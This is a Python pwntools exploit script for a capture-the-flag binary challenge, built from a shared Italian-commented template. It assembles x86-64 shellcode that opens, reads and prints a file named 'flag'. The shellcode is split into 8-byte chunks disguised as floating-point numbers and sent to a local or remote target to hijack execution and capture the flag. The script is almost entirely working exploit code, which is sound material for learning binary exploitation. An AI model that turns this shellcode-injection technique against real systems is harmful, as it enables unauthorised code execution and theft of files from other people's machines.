#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chall")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main+407; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val, ssl=True)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
def to_float(byte_chunk):
    byte_chunk = byte_chunk.ljust(8, b'\x90')
    val = struct.unpack('<d', byte_chunk)[0]
    return val

shellcode = asm(f"""
    /* open(flag_str, 0, 0) */
    lea rdi, [rip + flag_str]   
    xor rsi, rsi                
    xor rdx, rdx               
    mov rax, {constants.SYS_open}                 
    syscall

    /* read(fd, stack_buffer, 100) */
    mov rdi, rax               
    mov rsi, rsp                
    mov rdx, 100       
    mov rax, {constants.SYS_read}
    syscall

    /* write(1, stack_buffer, len) */
    mov rdx, rax                
    mov rdi, 1                  
    mov rsi, rsp
    mov rax, {constants.SYS_write}
    syscall

    /* exit(0) */
    mov rax, {constants.SYS_exit}
    xor rdi, rdi
    syscall

flag_str:
    .string "flag"
""")

while len(shellcode) % 8 != 0:
    shellcode += b'\x90'

tokens = [shellcode[i:i+8] for i in range(0, len(shellcode), 8)]
size = len(tokens)
info(f"asking for {size} float numbers")
io.sendline(f"{size}".encode())

for t in tokens:
    fake_float = f"{to_float(t):.20g}"
    warning(f"Sending {t.hex()} as -> {fake_float}")
    io.sendline(fake_float.encode())

data = io.recvregex(rb'nite\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag', flag)
io.close()
